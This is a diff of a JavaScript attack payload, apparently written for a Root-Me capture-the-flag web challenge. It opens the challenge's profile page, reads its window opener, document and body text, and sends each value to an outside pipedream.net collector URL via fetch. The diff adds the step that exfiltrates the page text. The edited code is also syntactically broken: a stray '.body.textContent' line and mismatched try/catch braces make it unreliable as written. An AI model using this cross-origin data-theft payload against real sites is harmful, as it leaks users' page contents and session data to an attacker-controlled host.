@@ -7,7 +7,7 @@
 
 try{
 	var aaa = window.opener;
-	fetch('https://en6gc9c8vfzvo.x.pipedream.net/?c=' + aaa, {mode: 'no-cors'})
+	fetch('https://en6gc9c8vfzvo.x.pipedream.net/?opener=' + aaa, {mode: 'no-cors'})
 } catch (error) {
   	fetch('https://en6gc9c8vfzvo.x.pipedream.net/?errifr1='+error, {mode: 'no-cors'})
 }
@@ -17,11 +17,21 @@ try{
 	var aaa = open('http://challenge01.root-me.org:58003/profile', 'target');
 	var bb = aaa.opener
 	try{
-		fetch('https://en6gc9c8vfzvo.x.pipedream.net/?c=' + bb, {mode: 'no-cors'});
+		fetch('https://en6gc9c8vfzvo.x.pipedream.net/?openernew=' + bb, {mode: 'no-cors'});
 
 		try{
 			var cc = bb.document
-			fetch('https://en6gc9c8vfzvo.x.pipedream.net/?c=' + cc, {mode: 'no-cors'});
+			fetch('https://en6gc9c8vfzvo.x.pipedream.net/?documentnew=' + cc, {mode: 'no-cors'});
+
+			
+				var dd = cc.body.textContent
+				fetch('https://en6gc9c8vfzvo.x.pipedream.net/?documentnewtext=' + dd, {mode: 'no-cors'});
+
+				.body.textContent
+				
+			} catch (error) {
+		  		fetch('https://en6gc9c8vfzvo.x.pipedream.net/?errifr5='+error, {mode: 'no-cors'})
+			}
 		} catch (error) {
 	  		fetch('https://en6gc9c8vfzvo.x.pipedream.net/?errifr4='+error, {mode: 'no-cors'})
 		}
